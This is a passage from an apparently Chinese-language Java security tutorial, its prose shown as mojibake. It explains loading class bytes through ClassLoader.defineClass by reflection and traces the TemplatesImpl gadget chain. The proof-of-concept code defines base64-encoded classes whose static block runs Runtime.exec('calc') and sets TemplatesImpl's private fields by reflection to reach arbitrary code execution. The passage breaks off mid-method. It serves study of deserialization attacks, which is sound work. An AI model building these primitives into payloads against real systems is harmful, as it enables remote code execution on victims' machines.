è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆåŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹æ‰§è¡ŒfindClass findClassçš„ä½œç”¨å°±æ˜¯æ ¹æ®åŸºç¡€URLåˆ¶å®šçš„æ–¹å¼æ¥æŸ¥æ‰¾ç±»ï¼Œè¯»å–å­—èŠ‚ç åäº¤ç»™defineClass defineClassçš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±» defineClasså†³å®šå¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬æ¢å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJavaé»˜è®¤çš„ClassLoader.defineClassæ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼ˆCè¯­è¨€å®ç°ï¼‰ï¼š\nåˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\nåˆ©ç”¨åå°„è·å–defineClassæ–¹æ³•\n1 2 3 4 5 6 7 8 import java.lang.reflect.Method; public class Main{ public static void main(String[] args){ Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class, int.class, int.class); method.setAccessible(true); } } æ­¤æ—¶Text.javaå†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import java.lang.Runtime; public class Text{ static{ try{ Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); }catch(Exception e){ System.out.println(\u0026#34;å¼‚å¸¸é€€å‡º\u0026#34;); } } } //è¿˜æ˜¯éœ€è¦æ³¨æ„classæ–‡ä»¶è¦æ²¡æœ‰åŒ…å å°†å…¶è½¬æ¢ä¸ºclassæ–‡ä»¶åå†è½¬æ¢ä¸ºbase64ç¼–ç ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package java_foundation; import java.nio.file.*; import java.util.Base64; public class FileToBase64 { public static void main(String[] args) { String filePath = \u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Text.class\u0026#34;; // è¯·æ›¿æ¢æˆä½ å®é™…çš„æ–‡ä»¶è·¯å¾„ try { byte[] fileBytes = readFileToByteArray(filePath); String base64Encoded = encodeBase64(fileBytes); System.out.println(\u0026#34;Base64 Encoded Content:\u0026#34;); System.out.println(base64Encoded); } catch (Exception e) { e.printStackTrace(); } } public static byte[] readFileToByteArray(String filePath) throws Exception { return Files.readAllBytes(Paths.get(filePath)); } public static String encodeBase64(byte[] data) { return Base64.getEncoder().encodeToString(data); } } //ä¹Ÿå¯ä»¥javacç¼–è¯‘ï¼Œç„¶åcatè¾“å‡ºæ˜¯Base64ç¼–ç ä¸€ä¸‹ï¼Œå°±æ˜¯éœ€è¦æ³¨æ„ideaå’Œjavacè¿è¡Œçš„JDKç‰ˆæœ¬è¦ç›¸åŒã€‚ å†ä½¿ç”¨base64è§£ç å°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„å­—èŠ‚ç äº†ï¼Œå¦‚ä¸‹ï¼š\n1 byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAKgoACAAbCgAcAB0IAB4KABwAHwcAIAoABQAhBwAiBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAAg8Y2xpbml0PgEAAXgBABNMamF2YS9sYW5nL1J1bnRpbWU7AQABeQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAgAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACQAKBwAkDAAlACYBAARjYWxjDAAnACgBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAApAAoBAARUZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAEAA0AAAAMAAEAAAAFAA4ADwAAAAgAEAAKAAEACwAAAIEAAgACAAAAFrgAAksSA0wqK7YABFenAAhLKrYABrEAAQAAAA0AEAAFAAMADAAAAB4ABwAAAAcABAAIAAcACQANAAwAEAAKABEACwAVAA0ADQAAACAAAwAEAAkAEQASAAAABwAGABMAFAABABEABAAVABYAAAAXAAAABwACUAcAGAQAAQAZAAAAAgAa\u0026#34;); åŠ è½½å­—èŠ‚ç æˆClasså¯¹è±¡ï¼Œç„¶åå®ä¾‹åŒ–æ‹¿åˆ°ä¸€ä¸ªå¯¹è±¡\n1 2 3 Class Test = (Class)method.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Test\u0026#34;, code, 0, code.length); Test.newInstance(); //ClassLoader.getSystemClassLoader()è¿”å›ç³»ç»Ÿçš„ç±»åŠ è½½å™¨å¯¹è±¡ è¿™é‡Œæ˜¯å› ä¸ºdefineClass()æ–¹æ³•æ˜¯ä¸€ä¸ªå®ä¾‹æ–¹æ³•ã€‚æ‰€ä»¥å¯ä»¥éœ€è¦ç”¨ä¸€ä¸ªå®ä¾‹å¯¹è±¡å³å¯ï¼Œæ‰€ä»¥æœ€ç»ˆå¦‚ä¸‹è¾“å‡ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package java_foundation; import java.lang.ClassLoader; import java.util.Base64; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAMQoACgAZCgAaABsIABwKABoAHQcAHgkAHwAgCAAhCgAiACMHACQHACUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxUZXh0OwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB4BAApTb3VyY2VGaWxlAQAJVGV4dC5qYXZhDAALAAwHACYMACcAKAEABGNhbGMMACkAKgEAE2phdmEvbGFuZy9FeGNlcHRpb24HACsMACwALQEADOW8guW4uOmAgOWHugcALgwALwAwAQAEVGV4dAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAAAwAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABlAAIAAQAAABa4AAISA7YABFenAAxLsgAGEge2AAixAAEAAAAJAAwABQADAA4AAAAWAAUAAAAGAAkACQAMAAcADQAIABUACgAPAAAADAABAA0ACAATABQAAAAVAAAABwACTAcAFggAAQAXAAAAAgAY\u0026#34;); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class,int.class,int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Text\u0026#34;,code,0,code.length); clazz.newInstance(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nä½¿ç”¨javacç›®å½•çš„è¯å°±éœ€è¦æ³¨æ„JDKçš„ç‰ˆæœ¬é—®é¢˜ï¼Œéœ€è¦ä¸€è‡´ã€‚\nåœ¨å‰é¢çš„POCä¸­è°ƒç”¨æ–¹æ³•æ—¶æ˜¯ç”¨çš„AppClassLoaderå®ä¾‹ï¼Œä¹Ÿæ˜¯æ‰çŸ¥é“åŸæ¥è¿™é‡Œè¿”å›çš„ClassLoaderæ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œé‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆè¿™æ ·ç”¨å‘¢ã€‚å¤§æ¦‚æƒ³ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“ï¼Œç”±äºdefineClass()æ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œæ‰€ä»¥å½“è°ƒç”¨invoke()æ–¹æ³•æ—¶éœ€è¦ä¸€ä¸ªå®ä¾‹ï¼Œå³éœ€è¦ä¸€ä¸ªClassLoaderçš„å®ä¾‹æ¥è°ƒç”¨å®ƒã€‚è¿™é‡Œå°±æ˜¯ç”¨AppClassLoaderç±»åŠ è½½å™¨æ¥åŠ è½½Textç±»ï¼Œå¤§æ¦‚å°±æ˜¯è¿™ä¸ªæ„æ€ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nåŒæ ·çš„å¯ä»¥ç›´æ¥åˆ©ç”¨IOè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.lang.ClassLoader; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Text.class\u0026#34;)); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class,int.class,int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Text\u0026#34;,code,0,code.length); clazz.newInstance(); } } åŒæ—¶è¦æƒ³åˆ°è¿™é‡Œæ—¢ç„¶å¯ä»¥åˆ©ç”¨defineClass()æ–¹æ³•ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„æ—¶å€™ä¹Ÿè¦æƒ³åˆ°è¿™ä¸€ç‚¹ï¼Œä¹Ÿè®¸å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚\nåœ¨defineClassè¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œï¼Œè€Œä¸”å³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼Œåœ¨defineClassæ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿ç”¨defineClassåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚\nä¸€å®šè¦æ³¨æ„çš„æ˜¯ï¼šç”±äºç³»ç»Ÿçš„ClassLoader#defineClassæ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œå¿…é¡»ä½¿ç”¨åå°„çš„å½¢å¼æ¥è°ƒç”¨ã€‚\nåœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸ºdefineClassæ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾TemplateImplçš„åŸºçŸ³\nåˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç  è™½ç„¶å¤§éƒ¨åˆ†ä¸Šå±‚å¼€å‘è€…ä¸ä¼šç›´æ¥ä½¿ç”¨åˆ°defineClassæ–¹æ³•ï¼Œä½†æ˜¯Javaåº•å±‚è¿˜æ˜¯æœ‰ä¸€äº›ç±»ç”¨åˆ°äº†å®ƒï¼Œè¿™å°±æ˜¯TemplatesImplã€‚\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImplè¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»TransletClassLoaderï¼Œæºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 static final class TransletClassLoader extends ClassLoader { private final Map\u0026lt;String,Class\u0026gt; _loadedExternalExtensionFunctions; TransletClassLoader(ClassLoader parent) { super(parent); _loadedExternalExtensionFunctions = null; } TransletClassLoader(ClassLoader parent,Map\u0026lt;String, Class\u0026gt; mapEF) { super(parent); _loadedExternalExtensionFunctions = mapEF; } public Class\u0026lt;?\u0026gt; loadClass(String name) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; ret = null; if (_loadedExternalExtensionFunctions != null) { ret = _loadedExternalExtensionFunctions.get(name); } if (ret == null) { ret = super.loadClass(name); } return ret; } Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length); } } è¿™ä¸ªç±»ç»§æ‰¿è‡ªClassLoaderç±»ï¼Œå¹¶ä¸”é‡å†™äº†defineClassæ–¹æ³•ï¼Œæ˜¯ä¸€ä¸ªé™æ€ç±»ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾ç¤ºåœ°å£°æ˜å…¶å®šä¹‰åŸŸï¼Œé‚£ä¹ˆå®ƒçš„ä½œç”¨åŸŸå°±æ˜¯defaultï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚\næ³¨æ„çœ‹å®ƒçš„defineClass()æ–¹æ³•ï¼Œå’Œå‰é¢è¯´çš„åˆ©ç”¨çš„defineClassè°ƒç”¨çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œå¯ä»¥å°è¯•è°ƒç”¨ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯åªä¼ å…¥äº†byteï¼Œåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œæœ¬æ¥è¿™ä¸ªé‡ç‚¹åº”è¯¥å°±æ˜¯å­—èŠ‚ç ã€‚\né‚£ä¹ˆç°åœ¨ä» TransletClassLoader#defineClass() å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š\n1 2 3 TemplatesImpl#getOutputProperties() -\u0026gt; TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses() -\u0026gt; TransletClassLoader#defineClass() é‚£ç°åœ¨æ¥è·Ÿä¸€ä¸‹è¿™ä¸ªè°ƒç”¨é“¾ï¼Œä»åå¾€å‰ã€‚\næˆ‘ä»¬çœ‹TemplatesImpl#defineTransletClasses()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) {//æ³¨æ„è¿™é‡Œ ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); +++++++ for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è°ƒç”¨äº†TransletClassLoaderç±»çš„defineClass()æ–¹æ³•ï¼Œè¿™é‡Œä¸å°±æ­£å¥½å¯¹åº”å‰é¢è°ƒç”¨çš„æ–¹æ³•äº†å—ã€‚\nç„¶åçœ‹å…¶ä»–ç‚¹ï¼š\né¦–å…ˆéœ€è¦_bytecodesä¸ç­‰äºnull\nä»¥åŠåœ¨è¿™ä¸ªTemplatesImplç±»ä¸­çš„å±æ€§ï¼š\nå¦åˆ™æ˜¯æ— æ³•è¿›è¡Œåé¢å‡ æ­¥çš„ã€‚\nä½†æ˜¯åœ¨TemplatesImplç±»ä¸­ï¼Œè¿™ä¸ªå˜é‡çš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 private byte[][] _bytecodes = null; è¿™é‡Œçš„_bytecodeså®šä¹‰ä¸ºç§æœ‰çš„å¹¶ä¸”æ²¡æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥ç›´æ¥ä¿®æ”¹å®ƒï¼Œåœ¨è¿™é‡Œå¯ä»¥åˆ©ç”¨åå°„è·å–å¹¶ä¿®æ”¹é‚£ä¸ªå˜é‡ã€‚\nè¿˜æœ‰çš„å…¶ä»–éœ€è¦æ³¨æ„çš„ç‚¹ï¼ŒdefineTransletClassesæ–¹æ³•ä¸­ä¼šæ‰§è¡Œä¸€ä¸ªrunæ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯ä¹‹å‰è¯´çš„å®ä¾‹åŒ–TransletClassLoaderç±»çš„ä»£ç ã€‚è¿™é‡Œä¸ºäº†é˜²æ­¢æŠ¥é”™æ‰€ä»¥_tfactoryä¸èƒ½ä¸ºç©ºï¼Œæ¥çœ‹ä¸€ä¸‹TemplatesImpleç±»ä¸­çš„_tfactoryçš„åˆå€¼ï¼š\n1 private transient TransformerFactoryImpl _tfactory = null; å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„å˜é‡_tfactoryéœ€è¦æ˜¯ä¸€ä¸ªTranformerFactoryImplç±»å‹çš„æ•°æ®ï¼Œå¹¶ä¸”åœ¨runæ–¹æ³•ä¸­è¦æ‰§è¡Œçš„å°±æ˜¯_tfactoryå˜é‡çš„æ–¹æ³•ã€‚æ‰€ä»¥è¿™é‡Œç›´æ¥å°†è¿™ä¸ª_tfactoryå˜é‡èµ‹å€¼ä¸ºTransformerFactoryImplç±»å®ä¾‹å³å¯ã€‚\nç°åœ¨ç»§ç»­çœ‹å“ªé‡Œä½¿ç”¨è¿‡è¿™ä¸ªdefineTransletClasses()æ–¹æ³•ï¼Œæœç´¢ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 //ç¬¬ä¸€ä¸ªï¼š private synchronized Class[] getTransletClasses() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _class; } //ç¬¬äºŒä¸ªï¼š public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } //ç¬¬ä¸‰ä¸ª(éƒ¨åˆ†ä»£ç )ï¼š private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); ............... return translet; } catch (TransformerConfigurationException e) { // Falls through } } ç¬¬ä¸€ä¸ªæ–¹æ³•ä¸ºç§æœ‰ï¼Œå¾€ä¸Šè°ƒç”¨ï¼Œæ²¡æœ‰ä»€ä¹ˆæ–¹æ³•ä½¿ç”¨è¿‡ï¼Œé‚£ä¹ˆå°±åªæœ‰æ”¾å¼ƒã€‚\nç¬¬äºŒä¸ªæ–¹æ³•ä¸ºpublicï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä½†æ˜¯æœ‰é™åˆ¶ï¼Œåé¢ä¼šè¯´ã€‚\nç¬¬ä¸‰ä¸ªæ–¹æ³•å‘ä¸Šè°ƒç”¨å‘ç°æœ‰ä¸€ä¸ªæ–¹æ³•è°ƒç”¨äº†ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªpublicæ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } é‚£ä¹ˆç°åœ¨çš„æ€è·¯å°±æ˜¯å®ä¾‹åŒ–TemplatesImplå¯¹è±¡åç›´æ¥è°ƒç”¨å®ƒçš„æ–¹æ³•å°±èƒ½ç›´æ¥ä½¿ç”¨ã€‚\nç°åœ¨æ¥çœ‹çœ‹ä½¿ç”¨çš„æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 å¯¹äºç¬¬ä¸‰ä¸ªï¼š ï¼ˆ1ï¼‰åœ¨newTransformer()æ–¹æ³•ä¸­ï¼š TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);//è¿›å…¥ä¸‹ä¸€ä¸ªæ–¹æ³•å¹¶ä¸éœ€è¦æ¡ä»¶ç»§ç»­ï¼Œè¿™é‡Œå°±ç›´æ¥è¯¶è°ƒç”¨get ï¼ˆ2ï¼‰åœ¨ getTransletInstance()æ–¹æ³•ä¸­ï¼š if (_name == null) return null; if (_class == null) defineTransletClasses(); //è¿™é‡Œè¦æ±‚_nameä¸èƒ½ä¸ºnullï¼Œ_classéœ€è¦ä¸ºnullç„¶åç»§ç»­è·Ÿè¿› ï¼ˆ3ï¼‰åœ¨ defineTransletClasses() æ–¹æ³•ä¸­ if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); }//_bytecodesä¸èƒ½ä¸ºnull TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());//_tfactoryéœ€è¦èµ‹å€¼ä¸ºTransformerFactoryImplå¯¹è±¡ } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); //åœ¨è¿™é‡Œè°ƒç”¨äº†defineClassæ–¹æ³• final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } ç°åœ¨æ¥æ€»ç»“ä¸€ä¸‹ä¸Šé¢é‡åˆ°çš„å˜é‡\n1 2 3 4 private String _name = null; private Class[] _class = null; private byte[][] _bytecodes = null; private transient TransformerFactoryImpl _tfactory = null; è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿™äº›å˜é‡éƒ½æ˜¯ç§æœ‰ç±»ï¼Œè€Œä¸”æ²¡æœ‰æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥åªèƒ½ç”¨åå°„è·å–æ”¹å€¼ã€‚æ‰€ä»¥æœ€ç»ˆå¯ä»¥è¿™æ ·æ„é€ :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { byte[] bytecodes = Base64.getDecoder().decode(\u0026#34;xxxx\u0026#34;); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytecodes}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); mpl.newTransformer(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } ä½†æ˜¯ç°åœ¨åˆé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±ç®—æˆåŠŸåŠ è½½äº†Classå¯¹è±¡ï¼Œè¿™é‡Œå¹¶ä¸èƒ½ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°ï¼Œå³æ²¡æœ‰åˆå§‹åŒ–ï¼Œè¿™æ ·å¹¶ä¸èƒ½åˆ©ç”¨æˆ‘ä»¬è‡ªå·±æ„é€ çš„ä»£ç ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³ï¼Œç»§ç»­çœ‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } å¯ä»¥çœ‹åˆ°ä»£ç ååŠéƒ¨åˆ†å®ä¾‹åŒ–äº†ä¸€ä¸ªå¯¹è±¡ç»™transletï¼Œå¹¶ä¸”æœ€åè¿”å›çš„ä¹Ÿæ˜¯transletï¼Œæ‰€ä»¥è¿˜æ˜¯è¿™é‡Œçš„newInstance()æœ‰ç”¨ï¼ˆé‡ç‚¹ï¼Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ªæ„é€ æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹è±¡æ—¶æ¥åˆ©ç”¨ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå°†æ¶æ„ä»£ç è®¾ç½®åœ¨æ„é€ æ–¹æ³•ä¸­ï¼‰ï¼Œæ‰€ä»¥è¦ç¡®ä¿è¿›å…¥defineTransletClasses()å¹¶ä¸ä¼šæŠ¥é”™ï¼Œç°åœ¨ç»§ç»­æ¥çœ‹defineTransletClasses()æ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new 